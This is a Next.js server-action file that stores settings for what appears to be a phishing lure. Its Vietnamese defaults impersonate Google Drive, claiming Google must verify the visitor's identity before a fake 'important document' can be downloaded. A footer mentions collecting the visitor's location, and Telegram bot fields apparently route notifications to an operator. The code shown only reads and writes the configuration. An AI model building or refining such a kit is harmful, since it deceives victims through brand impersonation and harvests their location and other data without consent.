
'use server';

import { promises as fs } from 'fs';
import path from 'path';
import { revalidatePath } from 'next/cache';

const configDir = path.join(process.cwd(), 'src', 'config');
const configPath = path.join(configDir, 'verification.json');

export interface VerificationConfig {
  title: string;
  description: string;
  fileName: string;
  fileInfo: string;
  buttonText: string;
  footerText: string;
  redirectUrl: string;
  previewImageUrl: string;
  telegramBotToken: string;
  telegramChatId: string;
  telegramNotificationsEnabled: boolean;
}

const defaultConfig: VerificationConfig = {
    title: "Xác minh để tiếp tục",
    description: "Để bảo vệ tệp và ngăn chặn truy cập trái phép, Google cần xác minh nhanh danh tính của bạn.",
    fileName: "Tai-lieu-quan-trong.pdf",
    fileInfo: "1.2 MB - Tệp an toàn",
    buttonText: "Xác minh & Tải xuống",
    footerText: "Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.",
    redirectUrl: "https://www.facebook.com",
    previewImageUrl: "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg",
    telegramBotToken: "",
    telegramChatId: "",
    telegramNotificationsEnabled: false,
};

export async function getVerificationConfigAction(): Promise<VerificationConfig> {
  try {
    const content = await fs.readFile(configPath, 'utf-8');
    const parsed = JSON.parse(content);
    // Merge with default to ensure new fields are present if config is old
    return { ...defaultConfig, ...parsed };
  } catch (error) {
    // If file doesn't exist or is unreadable, return default config in memory.
    // The file will be created on the next save action.
    return defaultConfig;
  }
}

export async function updateVerificationConfigAction(newConfig: VerificationConfig) {
  try {
    // Ensure the directory exists before writing the file
    await fs.mkdir(configDir, { recursive: true });
    await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2), 'utf-8');
    // Revalidate the home page and root layout to reflect changes instantly
    revalidatePath('/');
    revalidatePath('.', 'layout');
    return { success: true, message: 'Settings updated successfully.' };
  } catch (error) {
    const message = error instanceof Error ? error.message : 'An unknown error occurred';
    return { success: false, message: `Failed to update settings: ${message}` };
  }
}
